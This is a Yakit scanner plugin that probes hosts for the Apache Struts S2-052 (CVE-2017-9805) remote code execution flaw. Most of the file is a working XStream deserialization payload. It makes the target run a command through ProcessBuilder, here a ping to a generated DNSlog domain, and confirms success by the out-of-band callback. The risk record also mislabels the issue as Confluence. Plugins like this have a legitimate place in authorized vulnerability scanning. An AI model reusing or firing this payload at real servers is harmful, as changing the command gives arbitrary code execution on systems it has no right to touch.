# port scan plugin
yakit.AutoInitYakit()
//s2-052_CVE-2017-9805_poc.yak
//# S2-052(CVE-2017-9805) 远程代码执行漏洞
//默认调用portscan扫描
handleCheck = func(target,port,datas,token,server){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `POST /orders/3/edit HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/xml
Content-Length: 2415

<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>ping</string>
                        <string>-c</string>
                        <string>2</string>
                        <string>{{params(datas)}}</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"datas":datas}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        dnsdata, dnserr = risk.CheckDNSLogByToken(token)
        if len(dnsdata) > 0 {
            yakit.Info("%v found S2-052(CVE-2017-9805) 远程代码执行漏洞", addr)
            println(dnsdata)
            risk.NewRisk(
            addr,risk.title("CVE-2017-9805"),
            risk.severity("high"),
            risk.titleVerbose("S2-052(CVE-2017-9805) 远程代码执行漏洞"),
            risk.type("rce[Confluence]"),
            risk.payload(`<command>
                        <string>ping</string>
                        <string>-c</string>
                        <string>2</string>
                        <string>dnslog</string>`),
            risk.token(server),
        )
        }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    server, token, err = risk.NewDNSLogDomain()
    yakit.Info(server)
    log.info(server)
    datas = server
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port,datas,token,server)
    }
    
}
